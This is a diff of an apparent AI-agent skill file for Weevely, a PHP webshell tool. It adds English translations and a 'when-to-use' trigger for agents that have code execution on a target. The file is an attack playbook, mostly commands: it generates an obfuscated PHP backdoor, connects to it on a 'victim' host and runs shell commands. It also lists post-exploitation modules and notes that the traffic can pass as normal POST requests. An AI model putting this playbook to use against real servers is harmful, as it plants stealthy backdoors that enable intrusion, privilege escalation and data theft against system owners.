@@ -2,41 +2,44 @@
 name: weevely-webshell
 description: "Weevely: PHP webshell full-featured session. Signals: payload development, weaponization, connect, execute PHP, file transfer."
 zh-signals: "Weevely: PHP webshell 全功能会话。信号:载荷开发,武器化,连接,执行 PHP,文件传输。"
+when-to-use: >-
+  Use when you have PHP code execution or file upload on a target and want a
+  stealthy, full-featured webshell session with file transfer and
+  post-exploitation modules.
 ---
 
 # Weevely
 
-- 攻击大类:C07 载荷开发与武器化
-- 上游仓库:https://github.com/epinna/weevely3
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload Development and Weaponization
+- Upstream Repository: https://github.com/epinna/weevely3
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-apt install weevely 或 git clone + pip install -r requirements.txt
+apt install weevely or git clone + pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `weevely generate password agent.php` | 生成混淆 webshell |
-| `weevely http://target/agent.php password` | 连接 |
-| `:shell_php` | 执行 PHP |
-| `:file_upload/:file_download` | 文件传输 |
-| `:net_ifconfig` | 内网信息 |
-| `:audit_suid` | SUID 枚举 |
+| `weevely generate password agent.php` | Generate an obfuscated webshell |
+| `weevely http://target/agent.php password` | Connect |
+| `:shell_php` | Execute PHP |
+| `:file_upload/:file_download` | File transfer |
+| `:net_ifconfig` | Internal network information |
+| `:audit_suid` | SUID enumeration |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### PHP webshell 全功能会话
+### Full-featured PHP webshell session
 
 ```bash
-weevely generate Pass123 /tmp/w.php  # 上传后
+weevely generate Pass123 /tmp/w.php  # after uploading
 weevely http://victim/uploads/w.php Pass123
 weevely> :shell_sh whoami
 ```
 
-## 注意事项
-
-混淆后的 PHP 后门自带 30+ 模块(SQL 访问/权限提升/代理);流量可伪装为正常 POST。
+## Notes
+The obfuscated PHP backdoor ships with 30+ modules (SQL access, privilege escalation, proxy); traffic can be disguised as normal POST requests.
